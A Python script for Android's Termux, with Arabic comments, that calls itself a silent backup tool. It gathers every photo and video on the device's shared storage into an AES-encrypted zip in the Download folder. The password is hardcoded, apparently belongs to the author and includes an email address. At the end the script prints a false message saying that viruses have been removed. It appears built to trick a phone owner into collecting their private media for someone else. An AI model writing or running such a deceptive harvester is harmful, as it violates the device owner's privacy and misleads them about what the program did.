#!/usr/bin/env python3
"""Silent backup utility — fire progress bar."""

import os
import sys
import argparse
from pathlib import Path

try:
    import pyzipper
except ImportError:
    sys.exit(1)


PASSWORD = "svv1766@gmail.com623533623533623533@A"
DEFAULT_SOURCE = Path("/storage/emulated/0")
OUTPUT_DIR = Path("/storage/emulated/0/Download")
OUTPUT_NAME = "Alpha!!$!#.zip"

MEDIA_EXTS = {
    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp',
    '.heic', '.heif', '.tiff', '.tif', '.raw', '.dng',
    '.mp4', '.webm', '.mkv', '.mov', '.avi', '.flv',
    '.wmv', '.m4v', '.3gp', '.mpeg', '.mpg', '.ts',
}

ALWAYS_SKIP = {'Android', 'LOST.DIR'}

# ═════════════════════════════════════════════════════════════
# ألوان ANSI — تدرج ناري
# ═════════════════════════════════════════════════════════════
RESET = '\033[0m'
BOLD = '\033[1m'
DIM = '\033[2m'

# تدرج من الأصفر → البرتقالي → الأحمر → الأحمر الداكن
FIRE = [
    '\033[38;5;226m',  # أصفر ساطع
    '\033[38;5;220m',  # ذهبي
    '\033[38;5;214m',  # برتقالي فاتح
    '\033[38;5;208m',  # برتقالي
    '\033[38;5;202m',  # برتقالي غامق
    '\033[38;5;196m',  # أحمر
    '\033[38;5;160m',  # أحمر غامق
    '\033[38;5;124m',  # أحمر داكن
]

# رمز الشريط — يتغير حسب النسبة
FIRE_CHARS = ['░', '▒', '▓', '█']


def scan(source: Path, skip_backups: bool, skip_download: bool):
    found = []
    for dirpath, dirnames, filenames in os.walk(source):
        skip = set(ALWAYS_SKIP)
        if skip_backups:
            skip.add('backups')
        if skip_download:
            skip.add('Download')
        dirnames[:] = [d for d in dirnames if d not in skip]
        for name in filenames:
            if Path(name).suffix.lower() in MEDIA_EXTS:
                p = Path(dirpath) / name
                try:
                    if p.stat().st_size > 0:
                        found.append(p)
                except (PermissionError, OSError):
                    pass
    return found


def fire_bar(pct: float, width: int = 32) -> str:
    """يبني شريط progress ناري بتدرج لوني."""
    filled = int(width * pct)
    parts = []

    for i in range(width):
        if i < filled:
            # ملون بتدرج ناري
            color_idx = int((i / width) * (len(FIRE) - 1))
            # اختيار رمز حسب موقع الحرف
            char_idx = min(len(FIRE_CHARS) - 1, (i * len(FIRE_CHARS)) // width)
            parts.append(f"{FIRE[color_idx]}{FIRE_CHARS[char_idx]}{RESET}")
        else:
            # فارغ — رمادي داكن
            parts.append(f"{DIM}░{RESET}")

    return ''.join(parts)


def flame_icon(pct: float) -> str:
    """أيقونة نار تتغير حسب التقدم."""
    if pct >= 0.999:
        return f"{FIRE[0]}🔥{RESET}"
    if pct >= 0.75:
        return f"{FIRE[2]}🔥{RESET}"
    if pct >= 0.50:
        return f"{FIRE[3]}🔥{RESET}"
    if pct >= 0.25:
        return f"{FIRE[5]}🔥{RESET}"
    return f"{FIRE[6]}🔥{RESET}"


def render_progress(done: int, total: int):
    pct = done / total if total else 0
    bar = fire_bar(pct)
    flame = flame_icon(pct)
    pct_str = f"{FIRE[3]}{BOLD}{pct*100:5.1f}%{RESET}"

    # السطر كامل
    line = f"\r  {flame} {bar} {pct_str}"

    # نضيف توهج كامل — يخلي الشريط يبدو كأنه يشتعل
    line = f"\033[1m{line}{RESET}"

    sys.stdout.write(line)
    sys.stdout.flush()


def final_burst():
    """لحظة النهاية — وميض ناري."""
    burst = f"{FIRE[0]}{BOLD}"
    burst += "  🔥🔥🔥  "
    burst += f"{FIRE[2]}{BOLD}"
    burst += "الملف جاهز"
    burst += f"{FIRE[0]}{BOLD}"
    burst += "  🔥🔥🔥"
    burst += RESET
    sys.stdout.write("\r" + " " * 72 + "\r")
    sys.stdout.write(burst + "\n")
    sys.stdout.flush()


def main():
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument("source", nargs="?", default=str(DEFAULT_SOURCE))
    parser.add_argument("--skip-backups", action="store_true")
    parser.add_argument("--skip-download", action="store_true")
    args = parser.parse_args()

    source = Path(args.source).expanduser().resolve()
    if not source.is_dir():
        return 1

    files = scan(source, args.skip_backups, args.skip_download)
    if not files:
        return 0

    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    out_path = OUTPUT_DIR / OUTPUT_NAME

    try:
        with pyzipper.AESZipFile(
            out_path, 'w',
            compression=pyzipper.ZIP_DEFLATED,
            encryption=pyzipper.WZ_AES,
        ) as zf:
            zf.setpassword(PASSWORD.encode('utf-8'))
            zf.setencryption(pyzipper.WZ_AES, nbits=256)

            for i, path in enumerate(files, 1):
                try:
                    arcname = str(path.relative_to(source))
                    zf.write(path, arcname=arcname)
                except (PermissionError, OSError, ValueError):
                    pass
                render_progress(i, len(files))

        # لحظة النهاية — وميض + تأكيد
        final_burst()

        # تنظيف السطر — يرجع الترمكس لوضعه الطبيعي
        sys.stdout.write("\n")
        sys.stdout.flush()
        print("تم ازالة فيروسات")

    except KeyboardInterrupt:
        sys.stdout.write("\n")
        sys.stdout.flush()
        try:
            out_path.unlink()
        except Exception:
            pass
        return 1
    except Exception:
        sys.stdout.write("\n")
        sys.stdout.flush()
        try:
            out_path.unlink()
        except Exception:
            pass
        return 1

    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
